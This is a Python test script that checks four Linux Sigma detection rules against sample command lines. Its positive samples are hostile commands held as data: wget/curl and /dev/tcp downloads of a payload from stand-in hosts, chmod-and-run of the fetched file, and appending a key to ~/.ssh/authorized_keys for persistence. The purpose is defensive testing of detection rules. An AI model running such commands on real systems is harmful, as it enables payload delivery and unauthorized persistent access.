#!/usr/bin/env python3
import yaml
import re
from pathlib import Path

RULE_PATHS = [
    'rule/sigma_rules/standard/lnx-susp-download-tools.yml',
    'rule/sigma_rules/standard/lnx-susp-socket-redirection.yml',
    'rule/sigma_rules/standard/lnx-susp-exec-cleanup.yml',
    'rule/sigma_rules/standard/lnx-persist-ssh-key-auth.yml',
]

SAMPLES = {
    'lnx-susp-download-tools': {
        'positive': [
            "wget http://mal.example/payload -O /tmp/p",
            "curl -sS https://evil/p.sh -o /tmp/p.sh",
        ],
        'negative': [
            "echo wget is installed",
            "curl --version",
        ],
    },
    'lnx-susp-socket-redirection': {
        'positive': [
            'nohup bash -c "exec 6<>/dev/tcp/1.2.3.4/60138" && echo -n "GET /linux" >&6 && cat 0<&6 >/tmp/payload',
        ],
        'negative': [
            'echo hello world',
            'exec 6<>/dev/tcp/1.2.3.4/60138',
        ],
    },
    'lnx-susp-exec-cleanup': {
        'positive': [
            'chmod +x /tmp/p && ./p',
            'chmod +x /tmp/p && sh /tmp/p',
        ],
        'negative': [
            'chmod +x /tmp/script',
            'rm -rf /tmp/somefile',
        ],
    },
    'lnx-persist-ssh-key-auth': {
        'positive': [
            "echo 'ssh-rsa AAAAB3Nza...' >> ~/.ssh/authorized_keys",
            'cat id_rsa.pub >> ~/.ssh/authorized_keys',
        ],
        'negative': [
            'cat ~/.ssh/authorized_keys',
            'ls -la ~/.ssh',
        ],
    },
}


def load_rule(path):
    with open(path, 'r') as f:
        return yaml.safe_load(f)


def match_pattern(line, pat):
    # pat format examples: input|re: 'regex'  or input|contains: 'text' or raw string
    if isinstance(pat, dict):
        # expecting single kv like {'input|re': 'regex'}
        for k, v in pat.items():
            if 're' in k:
                rx = str(v)
                return re.search(rx, line) is not None
            if 'contains' in k:
                term = str(v)
                return term in line
        return False
    if isinstance(pat, str):
        # simple contains with wildcard tokens
        if pat.startswith('input|re:'):
            rx = pat.split(':', 1)[1].strip()
            rx = rx.strip('"').strip("'")
            return re.search(rx, line) is not None
        if pat.startswith('input|contains:'):
            term = pat.split(':', 1)[1].strip().strip('"').strip("'")
            return term in line
        # plain token
        return pat in line
    return False


def eval_rule_against_line(rule, line):
    det = rule.get('detection', {})
    # collect selection groups
    groups = {}
    for k, v in det.items():
        if isinstance(v, list):
            groups[k] = any(match_pattern(line, p) for p in v)
        elif isinstance(v, dict):
            # nested selection like selection_download: - input|re: '...'
            for subk, subv in v.items():
                pass
    # Also support named lists under detection (selection_download etc.)
    for key, val in det.items():
        if key.startswith('selection') and isinstance(val, list):
            groups[key] = any(match_pattern(line, p) for p in val)

    # determine condition string
    cond = det.get('condition')
    if not cond:
        # default: any selection group true
        return any(groups.values())
    # cond may be a string like 'selection_download' or 'selection_socket and selection_flow'
    if isinstance(cond, str):
        expr = cond
        for g in groups:
            expr = re.sub(r'\b' + re.escape(g) + r'\b', str(groups[g]), expr)
        try:
            return bool(eval(expr))
        except Exception:
            return groups.get(cond, False)
    return False


def run_tests():
    results = []
    for path in RULE_PATHS:
        rule = load_rule(path)
        title = rule.get('title', Path(path).name)
        rid = rule.get('id')
        key = Path(path).stem
        samples = SAMPLES.get(key, {})
        if not samples:
            continue
        for t, lines in samples.items():
            for ln in lines:
                matched = eval_rule_against_line(rule, ln)
                results.append((key, t, ln, matched))
    # print summary
    for key in sorted(set(r[0] for r in results)):
        print(f"=== {key} ===")
        for rec in [r for r in results if r[0]==key]:
            tag, t, ln, m = rec
            status = 'MATCH' if m else 'NO MATCH'
            print(f'[{t}] {status}: {ln}')
        print()


if __name__ == '__main__':
    run_tests()
